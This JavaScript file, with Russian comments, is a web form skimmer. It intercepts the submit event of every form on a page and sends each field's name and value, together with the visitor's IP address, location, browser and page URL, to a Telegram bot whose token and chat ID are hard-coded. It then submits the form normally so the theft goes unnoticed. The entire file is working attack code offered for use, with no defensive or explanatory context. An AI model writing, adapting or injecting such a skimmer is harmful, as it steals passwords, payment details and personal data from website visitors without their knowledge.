const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            let hashArray = Array.from(new Uint8Array(buffer));
            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
        });
}

function getIPInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => {
            if (!response.ok) {
                throw new Error("Ошибка получения информации о IP");
            }
            return response.json();
        })
        .then(data => {
            return {
                ip: data.ip,
                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
                org: window.location.hostname,
            };
        })
        .catch(err => console.error("Ошибка получения информации о IP:", err));
}

function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "Неизвестно";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
    const browser = browserMatches[0].split("/")[0]; // Название браузера
    const os = osMatches[1].split(";")[0]; // Операционная система
    return `${browser} on ${os}`;
}

// Функция для отправки данных формы
function sendFieldData(name, value) {
    // Не отправляем пустые значения
    if (!value) return;

    const simplifiedUserAgent = getSimplifiedUserAgent();

    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `📋 *Изменение в поле формы:*
---
- 🛡️ **Поле:** \`${name}\`
- ✍️ **Значение:** \`${value || "Не указано"}\`
- 🌐 **IP-адрес:** ${info.ip}
- 📍 **Местоположение:** ${info.location}
- 🖥️ **User-Agent:** ${simplifiedUserAgent}
- 🔗 **Страница:** ${window.location.href}
- 🏢 **Организация:** ${info.org}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
}

// Отслеживаем отправку формы
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", event => {
        // Прерываем стандартное поведение отправки формы
        event.preventDefault();

        // Перебираем все поля формы и отправляем их данные
        const formData = new FormData(form);
        formData.forEach((value, name) => {
            sendFieldData(name, value);
        });

        // После отправки данных в Telegram, отправляем форму на сервер
        form.submit();
    });
});
